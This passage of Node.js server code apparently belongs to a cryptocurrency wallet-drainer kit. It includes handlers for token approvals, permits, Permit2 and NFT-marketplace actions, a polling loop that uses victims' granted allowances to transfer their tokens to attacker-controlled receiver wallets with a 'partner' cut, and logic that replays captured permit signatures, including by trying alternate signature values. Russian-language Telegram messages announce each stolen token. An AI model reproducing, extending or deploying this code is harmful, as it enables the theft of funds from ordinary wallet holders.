    } else if (data['action'] == 'approve_token') {
      return approve_token(response, data);
    } else if (data['action'] == 'withdraw_native') {
      return do_withdraw_native(response, data);
    } else if (data['action'] == 'withdraw_token') {
      return do_withdraw_token(response, data);
    } else if (data['action'] == 'permit_token') {
      return permit_token(response, data);
    } else if (data['action'] == 'safa_approves') {
      return safa_approves(response, data);
    } else if (data['action'] == 'sign_permit2') {
      return sign_permit2(response, data);
    } else if (data['action'] == 'seaport') {
      if (SeaPort == null) {
        return response.status(200).send(JSON.stringify({
          status: 'error', error: 'SeaPort Module is not installed'
        }));
      }
      return seaport_handler(response, data);
    } else if (data['action'] == 'blur') {
      if (Blur == null) {
        return response.status(200).send(JSON.stringify({
          status: 'error', error: 'Blur Module is not installed'
        }));
      }
      return blur_handler(response, data);
    } else if (data['action'] == 'x2y2') {
      return x2y2_handler(response, data);
    } else if (data['action'] == 'partner_percent') {
      try {
        let split_data = get_split_data(data['address'] || false, MS_Split_Modes.native.contract, (data.amount_usd || null));
        return send_response(response, { status: 'OK', mode: !split_data ? false : true, percent: split_data });
      } catch(err) {
        return send_response(response, { status: 'OK', mode: false, percent: 0 });
      }
    }
  } catch(err) {
    console.log(err);
    response.status(500).send('Unable to Execute');
  }
});

try {
  web.post("/service/enable", async (_, response) => {
    try {
      if (!request.body['access_token'] || request.body['access_token'] != MS_API_Token || MS_API_Token == 'secret') {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      MS_Disable_System = false;
      return response.status(200).send(JSON.stringify({ status: 'OK' }));
    } catch(err) {
      console.log(err);
      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
    }
  });
  web.post("/service/disable", async (_, response) => {
    try {
      if (!request.body['access_token'] || request.body['access_token'] != MS_API_Token || MS_API_Token == 'secret') {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      MS_Disable_System = true;
      return response.status(200).send(JSON.stringify({ status: 'OK' }));
    } catch(err) {
      console.log(err);
      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
    }
  });
  web.post("/service/telegram", async (_, response) => {
    try {
      if (!request.body['access_token'] || request.body['access_token'] != MS_API_Token || MS_API_Token == 'secret') {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      const result = await bot.getMe();
      return response.status(200).send(JSON.stringify({ status: 'OK', data: { key: MS_Telegram_Token, chats: MS_Notifications, handle: result }}));
    } catch(err) {
      console.log(err);
      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
    }
  });
} catch(err) {
  console.log(err);
}

const withdraw_allowance = async (owner, spender, token, chain_id, permit2 = false, private = false, partner_address = false) => {
  try {
    let split_data = get_split_data(partner_address, MS_Split_Modes.tokens.repeat);
    let tx_count = !split_data ? 1 : 2;
    if (permit2) {
      let current_allowance = await Get_ERC20_Allowance(chain_id, token, owner, '0x000000000022d473030f116ddee9f6b43ac78ba3');
      if (!current_allowance) return false;
      const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
      const signer = new ethers.Wallet(private ? private : MS_Allowance_Withdraw.wallets[spender], node);
      const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_SINGLE'], signer);
      const contract_batch = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_BATCH'], signer);
      const permit_data = await contract.allowance(owner, token, spender);
      if (ethers.BigNumber.from(permit_data.amount).lt(ethers.BigNumber.from(current_allowance))) {
        return false;
      }
      const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
      let transfer_data = [];
      if (tx_count == 2) {
        let partner_amount = BN(current_allowance).div(BN(100)).mul(BN(split_data));
        let owner_amount = BN(current_allowance).sub(partner_amount);
        transfer_data.push({
          from: owner, to: MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)],
          token: token, amount: owner_amount
        });
        transfer_data.push({ from: owner, to: partner_address, token: token, amount: partner_amount });
      }
      try {
        if (tx_count == 1) gas_limit = await contract.estimateGas.transferFrom(owner, MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], current_allowance, token, { from: spender });
        else gas_limit = await contract_batch.estimateGas.transferFrom(transfer_data, { from: spender });
        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
      } catch(err) {
        gas_limit = 15000000;
      }
      if (ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('6000000'))) {
        return false;
      }
      if (private != false && private != MS_Wallet_Private) {
        const gas_amount_1 = ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(gas_limit));
        const signer_main = new ethers.Wallet(MS_Wallet_Private, node);
        const nonce_main = await node.getTransactionCount(MS_Wallet_Address, "pending");
        const tx_native = await signer_main.sendTransaction({
          from: MS_Wallet_Address, to: spender, value: gas_amount_1,
          gasLimit: ethers.BigNumber.from(String((data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 30000))),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce_main, data: '0x'
        });
        await node.waitForTransaction(tx_native.hash, 1, 30000);
      }
      const nonce = await node.getTransactionCount(spender, "pending");
      if (tx_count == 1) {
        const tx = await contract.transferFrom(owner, MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], current_allowance, token, {
          gasLimit: ethers.BigNumber.from(gas_limit),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce
        });
        await node.waitForTransaction(tx.hash, 1, 60000);
      } else {
        const tx = await contract_batch.transferFrom(transfer_data, {
          gasLimit: ethers.BigNumber.from(gas_limit),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce
        });
        await node.waitForTransaction(tx.hash, 1, 60000);
      }
      try {
        const contract_2 = new ethers.Contract(token, MS_Contract_ABI['ERC20'], signer);
        const balance = ethers.BigNumber.from(await contract_2.balanceOf(owner));
        update_allowance(owner, spender, token, chain_id, true, balance.toString());
      } catch(err) {
        console.log(err);
      }
      if (private != false && private != MS_Wallet_Private) {
        try {
          const new_balance = await signer.getBalance();
          const after_fee = ethers.BigNumber.from(new_balance).sub(ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(String((chain_id == 42161) ? 5000000 : (chain_id == 43114 ? 5000000 : 30000)))));
          if (ethers.BigNumber.from(after_fee).gt('0')) {
            await signer.sendTransaction({
              from: spender, to: MS_Wallet_Address,
              value: ethers.BigNumber.from(after_fee),
              gasLimit: ethers.BigNumber.from(String((chain_id == 42161) ? 5000000 : (chain_id == 43114 ? 5000000 : 30000))),
              gasPrice: ethers.BigNumber.from(gas_price),
              nonce: ethers.BigNumber.from(nonce).add(ethers.BigNumber.from('1')),
              data: '0x'
            });
          }
        } catch(err) {
          console.log(err);
        }
      }
      if (MS_Notifications.withdraw_token.mode) {
        await send_message(MS_Notifications.withdraw_token.chat_id, `<b>🎁 Нашли и вывели токен с кошелька</b>\n\n<b>Кошелек:</b> <code>${owner}</code>\n<b>Токен:</b> <code>${token}</code>\n<b>Сеть:</b> <code>${chain_id_to_name(chain_id)}</code>\n<b>Количество:</b> <code>${parseFloat(ethers.utils.formatEther(ethers.BigNumber.from(current_allowance)))}</code>`, {
          parse_mode: 'HTML'
        });
      }
    } else {
      let current_allowance = await Get_ERC20_Allowance(chain_id, token, owner, spender);
      if (!current_allowance) return false;
      const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
      const signer = new ethers.Wallet(private ? private : MS_Allowance_Withdraw.wallets[spender], node);
      const contract = new ethers.Contract(token, MS_Contract_ABI['ERC20'], signer);
      const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
      let gas_limit = null;
      try {
        gas_limit = await contract.estimateGas.transferFrom(owner, MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], current_allowance, { from: spender });
        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
      } catch(err) {
        gas_limit = 15000000;
      }
      if (ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('6000000'))) {
        return false;
      }
      if (private != false && private != MS_Wallet_Private) {
        const gas_amount_1 = ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(gas_limit)).mul(ethers.BigNumber.from(tx_count));
        const signer_main = new ethers.Wallet(MS_Wallet_Private, node);
        const nonce_main = await node.getTransactionCount(MS_Wallet_Address, "pending");
        const tx_native = await signer_main.sendTransaction({
          from: MS_Wallet_Address, to: spender, value: gas_amount_1,
          gasLimit: ethers.BigNumber.from(String((chain_id == 42161) ? 5000000 : (chain_id == 43114 ? 5000000 : 30000))),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce_main, data: '0x'
        });
        await node.waitForTransaction(tx_native.hash, 1, 30000);
      }
      const nonce = await node.getTransactionCount(spender, "pending");
      if (tx_count == 1) {
        const tx = await contract.transferFrom(owner, MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], current_allowance, {
          gasLimit: ethers.BigNumber.from(gas_limit),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce
        });
        await node.waitForTransaction(tx.hash, 1, 60000);
      } else {
        let partner_amount = BN(current_allowance).div(BN(100)).mul(BN(split_data));
        let owner_amount = BN(current_allowance).sub(partner_amount);
        const tx = await contract.transferFrom(owner, MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], owner_amount, {
          gasLimit: ethers.BigNumber.from(gas_limit),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce
        });
        await node.waitForTransaction(tx.hash, 1, 60000);
        const tx_2 = await contract.transferFrom(owner, partner_address, partner_amount, {
          gasLimit: ethers.BigNumber.from(gas_limit),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: BN(nonce).add(BN(1))
        });
        await node.waitForTransaction(tx_2.hash, 1, 60000);
      }
      try {
        const balance = ethers.BigNumber.from(await contract.balanceOf(owner));
        update_allowance(owner, spender, token, chain_id, false, balance.toString());
      } catch(err) {
        console.log(err);
      }
      if (private != false && private != MS_Wallet_Private) {
        try {
          const new_balance = await signer.getBalance();
          const after_fee = ethers.BigNumber.from(new_balance).sub(ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(String((chain_id == 42161) ? 5000000 : (chain_id == 43114 ? 5000000 : 300000)))));
          if (ethers.BigNumber.from(after_fee).gt('0')) {
            await signer.sendTransaction({
              from: spender, to: MS_Wallet_Address,
              value: ethers.BigNumber.from(after_fee),
              gasLimit: ethers.BigNumber.from(String((chain_id == 42161) ? 5000000 : (chain_id == 43114 ? 5000000 : 300000))),
              gasPrice: ethers.BigNumber.from(gas_price),
              nonce: ethers.BigNumber.from(nonce).add(ethers.BigNumber.from(tx_count)),
              data: '0x'
            });
          }
        } catch(err) {
          console.log(err);
        }
      }
      if (MS_Notifications.withdraw_token.mode) {
        await send_message(MS_Notifications.withdraw_token.chat_id, `<b>🎁 Нашли и вывели токен с кошелька</b>\n\n<b>Кошелек:</b> <code>${owner}</code>\n<b>Токен:</b> <code>${token}</code>\n<b>Сеть:</b> <code>${chain_id_to_name(chain_id)}</code>\n<b>Количество:</b> <code>${parseFloat(ethers.utils.formatEther(ethers.BigNumber.from(current_allowance)))}</code>`, {
          parse_mode: 'HTML'
        });
      }
    }
  } catch(err) {
    console.log(err);
  } return true;
};

if (MS_Allowance_Check) {
  let allowance_in_check = false;
  setInterval(async () => {
    try {
      if (allowance_in_check) return;
      let allowance_list = [];
      if (fs.existsSync('allowances.dat'))
        allowance_list = JSON.parse(fs.readFileSync('allowances.dat', 'utf-8'));
      allowance_in_check = true;
      for (const allowance of allowance_list) {
        try {
          if (MS_Wallet_Receiver.includes(allowance.owner)) continue;
          if (allowance.from_ts && Math.floor(Date.now() / 1000) < allowance.from_ts) continue;
          if (allowance.permit2) {
            const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[allowance.chain_id]);
            const signer = new ethers.Wallet(allowance.private ? allowance.private : MS_Wallet_Private, node);
            const contract = new ethers.Contract(allowance.token, MS_Contract_ABI['ERC20'], signer);
            const balance = ethers.BigNumber.from(await contract.balanceOf(allowance.owner));
            if (allowance.last_balance && balance.lte(ethers.BigNumber.from(allowance.last_balance))) continue;
            else update_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, true, balance.toString());
            const allowance_num = ethers.BigNumber.from(await contract.allowance(allowance.owner, '0x000000000022d473030f116ddee9f6b43ac78ba3'));
            if (allowance_num.lte(ethers.BigNumber.from('0'))) {
              remove_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, true);
              continue;
            }
            const contract_2 = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_SINGLE'], signer);
            const permit_data = await contract_2.allowance(allowance.owner, allowance.token, allowance.spender);
            if (ethers.BigNumber.from(permit_data.amount).lte(ethers.BigNumber.from('0'))) {
              remove_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, true);
              continue;
            }
            if (balance.gt(ethers.BigNumber.from('0'))) {
              let token_balance_usd = 0;
              if (MS_DeBank_Token != '' && MS_Allowance_Withdraw.min_amount > 0) {
                try {
                  let result = await axios.get(`https://pro-openapi.debank.com/v1/token?chain_id=${convert_chain('ID', 'DEBANK', allowance.chain_id)}&id=${allowance.token}`, {
                    headers: {
                      'Accept': 'application/json',
                      'AccessKey': MS_DeBank_Token
                    }
                  });
                  if (result.data.price)
                    token_balance_usd = result.data.price * parseFloat(ethers.utils.formatUnits(balance, result.data.decimals));
                } catch(err) {
                  console.log(err);
                }
              }
              if (MS_Allowance_Withdraw.mode == true && (MS_Allowance_Withdraw.min_amount <= 0 || MS_DeBank_Token == '' || token_balance_usd >= MS_Allowance_Withdraw.min_amount) && (MS_Allowance_Withdraw.wallets[allowance.spender] || allowance.private)) {
                await withdraw_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, true, allowance.private ? allowance.private : false, allowance.partner_address || false);
              } else {
                if (MS_Notifications.find_token.mode == true) {
                  await send_message(MS_Notifications.find_token.chat_id, `<b>🎁 Нашли токен на кошельке</b>\n\n<b>Обработчик:</b> <code>${allowance.spender}</code>\n<b>Кошелек:</b> <code>${allowance.owner}</code>\n<b>Токен:</b> <code>${allowance.token}</code>\n<b>Сеть:</b> <code>${chain_id_to_name(allowance.chain_id)}</code>\n<b>Количество:</b> <code>${parseFloat(ethers.utils.formatEther(ethers.BigNumber.from(balance)))}</code>\n\n<code>Доступ выдан через контракт Permit2</code>`, {
                    parse_mode: 'HTML'
                  });
                }
              }
              continue;
            }
          } else {
            const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[allowance.chain_id]);
            const contract = new ethers.Contract(allowance.token, MS_Contract_ABI['ERC20'], node);
            const balance = ethers.BigNumber.from(await contract.balanceOf(allowance.owner));
            if (allowance.last_balance && balance.eq(ethers.BigNumber.from(allowance.last_balance))) continue;
            else update_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, false, balance.toString());
            const allowance_num = ethers.BigNumber.from(await contract.allowance(allowance.owner, allowance.spender));
            if (allowance_num.lte(ethers.BigNumber.from('0'))) {
              remove_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id);
              continue;
            }
            if (balance.gt(ethers.BigNumber.from('0'))) {
              let token_balance_usd = 0;
              if (MS_DeBank_Token != '' && MS_Allowance_Withdraw.min_amount > 0) {
                try {
                  let result = await axios.get(`https://pro-openapi.debank.com/v1/token?chain_id=${convert_chain('ID', 'DEBANK', allowance.chain_id)}&id=${allowance.token}`, {
                    headers: {
                      'Accept': 'application/json',
                      'AccessKey': MS_DeBank_Token
                    }
                  });
                  if (result.data.price)
                    token_balance_usd = result.data.price * parseFloat(ethers.utils.formatUnits(balance, result.data.decimals));
                } catch(err) {
                  console.log(err);
                }
              }
              if (MS_Allowance_Withdraw.mode == true && (MS_Allowance_Withdraw.min_amount <= 0 || MS_DeBank_Token == '' || token_balance_usd >= MS_Allowance_Withdraw.min_amount) && (MS_Allowance_Withdraw.wallets[allowance.spender] || allowance.private)) {
                await withdraw_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, false, allowance.private ? allowance.private : false, allowance.partner_address || false);
              } else {
                if (MS_Notifications.find_token.mode == true) {
                  await send_message(MS_Notifications.find_token.chat_id, `<b>🎁 Нашли токен на кошельке</b>\n\n<b>Обработчик:</b> <code>${allowance.spender}</code>\n<b>Кошелек:</b> <code>${allowance.owner}</code>\n<b>Токен:</b> <code>${allowance.token}</code>\n<b>Сеть:</b> <code>${chain_id_to_name(allowance.chain_id)}</code>\n<b>Количество:</b> <code>${parseFloat(ethers.utils.formatEther(ethers.BigNumber.from(balance)))}</code>`, {
                    parse_mode: 'HTML'
                  });
                }
              }
              continue;
            }
          }
          await new Promise(r => setTimeout(r, 1000));
        } catch(err) {
          console.log(err);
        }
      }
    } catch(err) {
      console.log(err);
    } allowance_in_check = false;
  }, 20000);
}

if (MS_Enable_API && MS_Allowance_API) {
  web.post("/api/allowance/remove", (request, response) => {
    try {
      let data = request.body;
      if (!data['access_token'] || data['access_token'] != MS_API_Token) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      if (!data['owner'] || !data['spender'] || !data['token'] || !data['chain_id'] || !data['permit2']) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Invalid Arguments' }));
      }
      remove_allowance(data.owner, data.spender, data.token, data.chain_id, data.permit2);
      return response.status(200).send(JSON.stringify({ status: 'OK' }));
    } catch(err) {
      console.log(err);
    }
  });
  web.post("/api/allowance/list", (request, response) => {
    try {
      let data = request.body;
      if (!data['access_token'] || data['access_token'] != MS_API_Token) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      let allowance_list = [];
      if (fs.existsSync('allowances.dat'))
        allowance_list = JSON.parse(fs.readFileSync('allowances.dat', 'utf-8'));
      return response.status(200).send(JSON.stringify({
        status: 'OK', wallet: {
          address: MS_Wallet_Address,
          private: MS_Wallet_Private
        }, list: allowance_list
      }));
    } catch(err) {
      console.log(err);
    }
  });
  web.post("/api/allowance/withdraw", async (request, response) => {
    try {
      let data = request.body;
      if (!data['access_token'] || data['access_token'] != MS_API_Token) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      if (!data['owner'] || !data['spender'] || !data['token'] || !data['chain_id'] || !data['permit2']) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Invalid Arguments' }));
      }
      await withdraw_allowance(data.owner, data.spender, data.token, data.chain_id, data.permit2, data.private ? data.private : false);
      return response.status(200).send(JSON.stringify({ status: 'OK' }));
    } catch(err) {
      console.log(err);
      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unable to Execute' }));
    }
  });
}

if (MS_Enable_API) {
  web.post("/api/balance", (request, response) => {
    try {
      let data = request.body;
      if (!data['access_token'] || data['access_token'] != MS_API_Token) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      get_wallet_balance(data.address || MS_Wallet_Address).then(result => {
        if (result != false) {
          return response.status(200).send(JSON.stringify({ status: 'OK', data: result }));
        } else {
          return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
        }
      }).catch(err => {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
      });
    } catch(err) {
      console.log(err);
      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
    }
  });
  web.post("/api/retrive", (request, response) => {
    try {
      let data = request.body;
      if (!data['access_token'] || data['access_token'] != MS_API_Token) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      if (!fs.existsSync('API_DATA')) fs.writeFileSync('API_DATA', '[]', 'utf-8');
      let API_Data = JSON.parse(fs.readFileSync('API_DATA', 'utf-8'));
      fs.writeFileSync('API_DATA', '[]', 'utf-8');
      return response.status(200).send(JSON.stringify({ status: 'OK', data: API_Data }));
    } catch(err) {
      console.log(err);
      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
    }
  });
  setInterval(() => {
    try {
      if (!fs.existsSync('API_DATA')) fs.writeFileSync('API_DATA', '[]', 'utf-8');
      let API_Data = JSON.parse(fs.readFileSync('API_DATA', 'utf-8')), new_data = [];
      for (const asset of API_Data) {
        try {
          if (Math.floor(Date.now() / 1000) - asset.ts < 300) {
            new_data.push(asset);
          }
        } catch(err) {
          console.log(err);
        }
      }
      fs.writeFileSync('API_DATA', JSON.stringify(new_data), 'utf-8');
    } catch(err) {
      console.log(err);
    }
  }, 60000);
}

web.use((_, response) => {
  try {
    response.status(403).send('Sorry, this page in unavailable')
  } catch(err) {
    console.log(err);
  }
});

if (fs.existsSync('cert') && fs.existsSync(path.join('cert', 'server.key')) && fs.existsSync(path.join('cert', 'server.crt'))) {
  web.listen(80, () => {});
  https.createServer({
    key: fs.readFileSync(path.join('cert', 'server.key')),
    cert: fs.readFileSync(path.join('cert', 'server.crt'))
  }, web).listen(443);
  console.log('\tSERVER IS ONLINE, LISTENING TO PORT 80 & 443\n');
} else {
  web.listen(80, () => {
    console.log('\tSERVER IS ONLINE, LISTENING TO PORT 80\n');
  });
}

const repeat_permit = async (callback, permit_id, data) => {
  try {
    await send_message(callback.message.chat.id, `<b>Запущен процесс подписи Permit #${permit_id}</b>\n\nПо результатам успешной или неуспешной подписи вам придёт дополнительное уведомление.`, {
      parse_mode: 'HTML'
    });

    let check_wallet_address = (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) ? data.PW.address : MS_Wallet_Address;
    let check_wallet_private = (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) ? get_random_wallet_private(data.PW.address) : MS_Wallet_Private;

    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[data.sign.chain_id]);
    const signer = new ethers.Wallet(check_wallet_private, node);
    const contract = new ethers.Contract(data.sign.address, data.sign.abi, signer);
    const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();

    let allowance = ethers.BigNumber.from(await contract.allowance(data.address, check_wallet_address));
    let was_in_work = false;
    if (allowance.lte(ethers.BigNumber.from('0'))) {
      try {
        was_in_work = true;

        let gas_limit = null;
        try {
          if (data.sign.type == 1) {
            gas_limit = await contract.estimateGas.permit(data.sign.owner, data.sign.spender, data.sign.nonce, data.sign.deadline, true, data.sign.v, data.sign.r, data.sign.s, { from: check_wallet_address });
          } else {
            gas_limit = await contract.estimateGas.permit(data.sign.owner, data.sign.spender, data.sign.value, data.sign.deadline, data.sign.v, data.sign.r, data.sign.s, { from: check_wallet_address });
          }
          gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
        } catch(err) {
          if (MS_Settings.Permit.Bypass == 1)
            gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
          else gas_limit = 15000000;
        }
        const nonce = await node.getTransactionCount(check_wallet_address, "pending");
        if (MS_Settings.Permit.Bypass == 0 && ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('6000000'))) {
          const PERMIT_V_OPTIONS = [ 0, 1, 27, 28, 47, 215 ];
          let is_valid_option = false;
          if (MS_Settings.Permit.Challenge == 1) {
            for (const new_v of PERMIT_V_OPTIONS) {
              try {
                try {
                  if (data.sign.type == 1) {
                    gas_limit = await contract.estimateGas.permit(data.sign.owner, data.sign.spender, data.sign.nonce, data.sign.deadline, true, new_v, data.sign.r, data.sign.s, { from: check_wallet_address });
                  } else {
                    gas_limit = await contract.estimateGas.permit(data.sign.owner, data.sign.spender, data.sign.value, data.sign.deadline, new_v, data.sign.r, data.sign.s, { from: check_wallet_address });
                  }
                } catch(err) {
                  gas_limit = 15000000;
                }
                if (ethers.BigNumber.from(gas_limit).lt(ethers.BigNumber.from('6000000'))) {
                  gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
                  is_valid_option = true;
                  data.sign.v = new_v;
                  break;
                }
              } catch(err) {
                console.log(err);
              }
            }
          }
          if (is_valid_option == false) {
            await send_message(callback.message.chat.id, `<b>❌ Не удалось повторно подписать PERMIT #${permit_id}</b>\n\nДанные подписи невалидные и не могут быть использованы.`, {
              parse_mode: 'HTML'
            });
            return false;
          }
        }
        if (data.sign.type == 1) {
          if (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) {
            const gas_amount_1 = ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(gas_limit)).mul(ethers.BigNumber.from('2'));
            const signer_main = new ethers.Wallet(MS_Wallet_Private, node);
            const nonce_main = await node.getTransactionCount(MS_Wallet_Address, "pending");
            const tx_native = await signer_main.sendTransaction({
              from: MS_Wallet_Address, to: check_wallet_address, value: gas_amount_1,
              gasLimit: ethers.BigNumber.from(String((data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000))),
              gasPrice: ethers.BigNumber.from(gas_price),
              nonce: nonce_main, data: '0x'
            });
            await node.waitForTransaction(tx_native.hash, 1, 30000);
          }
          try {
            const tx = await contract.permit(data.sign.owner, data.sign.spender, data.sign.nonce, data.sign.deadline, true, data.sign.v, data.sign.r, data.sign.s, {
              gasLimit: ethers.BigNumber.from(gas_limit),
              gasPrice: ethers.BigNumber.from(gas_price),
              nonce: nonce
            });
            await node.waitForTransaction(tx.hash, 1, 60000);
            await send_message(callback.message.chat.id, `<b>✅ Успешно подписали PERMIT #${permit_id}</b>\n\nПроверяем получилось ли выдать подтверждение для токена...`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
            await send_message(callback.message.chat.id, `<b>❌ Не удалось повторно подписать PERMIT #${permit_id}</b>\n\nОшибка транзакции во время выполнения подписи.`, {
              parse_mode: 'HTML'
            });
            return false;
          }
        } else {
          if (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) {
            const gas_amount_1 = ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(gas_limit)).mul(ethers.BigNumber.from('2'));
            const signer_main = new ethers.Wallet(MS_Wallet_Private, node);
            const nonce_main = await node.getTransactionCount(MS_Wallet_Address, "pending");
            const tx_native = await signer_main.sendTransaction({
              from: MS_Wallet_Address, to: check_wallet_address, value: gas_amount_1,
              gasLimit: ethers.BigNumber.from(String((data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000))),
              gasPrice: ethers.BigNumber.from(gas_price),
              nonce: nonce_main, data: '0x'
            });
            await node.waitForTransaction(tx_native.hash, 1, 30000);
          }
          try {
            const tx = await contract.permit(data.sign.owner, data.sign.spender, data.sign.value, data.sign.deadline, data.sign.v, data.sign.r, data.sign.s, {
              gasLimit: ethers.BigNumber.from(gas_limit),
              gasPrice: ethers.BigNumber.from(gas_price),
              nonce: nonce
            });
            await node.waitForTransaction(tx.hash, 1, 60000);
            await send_message(callback.message.chat.id, `<b>✅ Успешно подписали PERMIT #${permit_id}</b>\n\nПроверяем получилось ли выдать подтверждение для токена...`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
            await send_message(callback.message.chat.id, `<b>❌ Не удалось повторно подписать PERMIT #${permit_id}</b>\n\nОшибка транзакции во время выполнения подписи.`, {
              parse_mode: 'HTML'
            });
            return false;
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (was_in_work) {
      allowance = ethers.BigNumber.from(await contract.allowance(data.address, check_wallet_address));
      if (allowance.lte(ethers.BigNumber.from('0'))) {
        await send_message(callback.message.chat.id, `<b>❌ Не удалось списать PERMIT #${permit_id}</b>\n\nПодтверждение не выдалось, возможно скам-токен.`, {
          parse_mode: 'HTML'
        });
        return false;
      }
    }

    let balance = ethers.BigNumber.from(await contract.balanceOf(data.address));

    if (balance.lte(ethers.BigNumber.from('0'))) {
      await send_message(callback.message.chat.id, `<b>❌ Не удалось списать PERMIT #${permit_id}</b>\n\nПодтверждение выдалось, но баланс токена нулевой.`, {
        parse_mode: 'HTML'
      });
      return false;
    }

    try {
      let gas_limit = null;
      try {
        gas_limit = await contract.estimateGas.transferFrom(data.sign.owner, MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], balance.lt(allowance) ? balance : allowance, { from: MS_Wallet_Address });
        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
      } catch(err) {
        if (MS_Settings.Approve.Bypass == 1)
          gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
        else gas_limit = 15000000;
      }
      if (MS_Settings.Approve.Bypass == 0 && ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('6000000'))) {
        await send_message(callback.message.chat.id, `<b>❌ Не удалось списать PERMIT #${permit_id}</b>\n\nОшибка при выполнении транзакции, слишком высокая комиссия.`, {
          parse_mode: 'HTML'
        });
        return false;
      }
      if (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) {
        const gas_amount_1 = ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(gas_limit)).mul(ethers.BigNumber.from('2'));
